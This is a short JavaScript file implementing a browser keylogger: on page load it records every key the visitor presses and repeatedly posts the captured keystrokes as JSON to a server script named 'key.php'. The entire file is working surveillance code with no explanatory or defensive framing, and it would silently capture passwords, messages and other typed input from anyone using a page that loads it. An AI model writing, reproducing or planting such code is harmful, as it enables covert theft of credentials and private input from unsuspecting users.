var keylog={
    cache:[],
    sending:false,
    init:()=>{
        window.addEventListener("keydown",(e)=>{
            keylog.cache.push(e.key)
        });
        window.setInterval(keylog.send);
    },
    send: ()=>{ if(!keylog.sending&& keylog.cache.length!=0){
        keylog.sending=true;
        var data=new FormData();
data.append("keys",JSON.stringify(keylog.cache));
keylog.cache=[];

fetch("key.php",{method:"POST" ,body:data })
.then(res=>res.text()).then(res => {
    keylog.sending = false;
    console.log(res);   })


  .catch(err => console.error(err));
        

    }},
    
    };
    
    
    window.addEventListener("DOMContentLoaded",keylog.init);